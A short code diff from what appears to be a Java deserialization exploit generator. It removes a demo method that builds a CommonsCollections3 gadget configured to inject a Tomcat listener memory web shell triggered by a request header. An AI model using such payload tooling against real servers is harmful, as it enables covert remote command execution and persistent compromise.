@@ -18,31 +18,6 @@ import java.io.PrintStream;
  */
 public class ObjectPayloadBuilder {
 
-    public static void main(String[] args) throws Exception {
-        final Class<? extends ObjectPayload> cls = CommonsCollections3.class;
-
-        SinksHelper sinksHelper = new SinksHelper();
-        String[] sinks = (String[]) Reflections.invokeMethod(cls.getAnnotation(Sink.class), "value", new Class[]{}, new Object[]{});
-        sinksHelper.setSink(sinks[0]);
-        sinksHelper.setEnchant(EnchantType.MEMSHELL);
-//        sinksHelper.setOutput(Save.Base64);
-        sinksHelper.setSave(true);
-//        sinksHelper.setCommand("open -a Calculator.app");
-
-        MemShellHelper memShellHelper = new MemShellHelper();
-        memShellHelper.setMiddleware(Middleware.Tomcat);
-        memShellHelper.setMemShell(MemShell.Listener);
-        memShellHelper.setMemShellFunction(MemShellFunction.Runtime);
-        // 内存马信息
-        memShellHelper.setHEADER("xxx");
-
-        sinksHelper.setMemShellHelper(memShellHelper);
-
-        // 生成 Gadget
-        Object gadget = builder(cls, sinksHelper);
-
-    }
-
     public static Object builder(Class<? extends ObjectPayload> cls, SinksHelper sinksHelper) throws Exception {
         // 生成 Gadget
         ObjectPayload payload = cls.newInstance();
